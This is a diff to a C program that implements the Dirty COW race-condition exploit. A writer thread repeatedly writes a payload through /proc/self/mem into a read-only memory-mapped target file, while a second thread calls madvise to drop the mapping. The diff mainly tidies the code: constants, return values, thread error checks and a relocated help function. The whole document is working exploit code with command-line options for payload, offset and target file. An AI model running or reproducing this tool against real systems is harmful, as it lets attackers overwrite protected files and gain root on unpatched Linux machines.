@@ -32,6 +32,9 @@
 		} \
 	} while (0)
 
+#define VIRTUAL_MEMORY "/proc/self/mem"
+#define THREAD_ITERATIONS 10000
+
 typedef struct payload_info {
 	char *string;
 	off_t offset;
@@ -46,36 +49,50 @@ void *writer_thread(void *arg) {
 	PayloadInfo *info = arg;
 	char *str = info->string;
 
-	int fd = open("/proc/self/mem", O_RDWR);
+	int fd = open(VIRTUAL_MEMORY, O_RDWR);
 	ERR_IF(fd < 0);
 
-	for (int i = 0; i < 10000; i++) {
+	for (int i = 0; i < THREAD_ITERATIONS; i++) {
 		if (info->append) {
 			lseek(fd, (uintptr_t) info->loc_in_mem, SEEK_END);
 		} else {
 			lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
 		}
+
 		write(fd, str, strlen(str));
 	}
+
+	return NULL;
 }
 
 // Advise kernel to drop mapping
 void *madviser_thread(void *arg) {
 	PayloadInfo *info = arg;
 
-	for (int i = 0; i < 10000; i++) {
+	for (int i = 0; i < THREAD_ITERATIONS; i++) {
 		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
 	}
+
+	return NULL;
 }
 
-int parse_opts(int argc, char *argv[]) {
+void print_help() {
+	printf("-f, --file   \t name of file contatining the payload\n"
+			"-s, --string\t interpret payload in the file as a string\n"
+			"-x, --hex   \t interpret payload in the file as hex values\n"
+			"-o, --offset\t offset postition for lseek (hex)\n"
+			"-a, --append\t append to target file\n"
+			"-h, --help  \t help print out\n"
+			"\nTarget file name must be the last argument\n");
+}
+
+PayloadInfo parse_opts(int argc, char *argv[]) {
 	PayloadInfo info = {
 		.input_fd = STDIN_FILENO,
 		.offset = 0x0,
-		.append = 0
+		.append = false
 	};
 
-	char interpret = 's';
 	int c;
 
  	while (true) {
@@ -113,14 +130,14 @@ int parse_opts(int argc, char *argv[]) {
 				sscanf(optarg, "%x", (unsigned int*) &info.offset);
 				printf("offset: %d\n", (int) info.offset);
 				break;
-			case 's':  // interpret contents of payload as a string
-				interpret = 's';
+			case 's':
+				// TODO take option as payload string
 				break;
-			case 'x':  // interpret contents of payload as hexadecimal
-				interpret = 'x';
+			case 'x':
+				// TODO take option as payload hex string
 				break;
 			case 'a':  // append to target file
-				info.append = 1;
+				info.append = true;
 				break;
 			case 'h':
 				print_help();
@@ -144,16 +161,6 @@ int parse_opts(int argc, char *argv[]) {
 	return info;
 }
 
-void print_help() {
-	printf("-f, --file   \t name of file contatining the payload\n"
-			"-s, --string\t interpret payload in the file as a string\n"
-			"-x, --hex   \t interpret payload in the file as hex values\n"
-			"-o, --offset\t offset postition for lseek (hex)\n"
-			"-a, --append\t append to target file\n"
-			"-h, --help  \t help print out\n"
-			"\nTarget file name must be the last argument\n");
-}
-
 int main(int argc, char *argv[]) {
 	PayloadInfo info = parse_opts(argc, argv);
 
@@ -165,11 +172,12 @@ int main(int argc, char *argv[]) {
 	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);
 
 	pthread_t thread_1, thread_2;
-	pthread_create(&thread_1, NULL, madviser_thread, &info);
-	pthread_create(&thread_2, NULL, writer_thread, &info);
 
-	pthread_join(thread_1, NULL);
-	pthread_join(thread_2, NULL);
+	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
+	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
+
+	ERR_IF_PTHREAD(pthread_join(thread_1, NULL));
+	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));
 
 	close(info.input_fd);
 	close(info.target_fd);
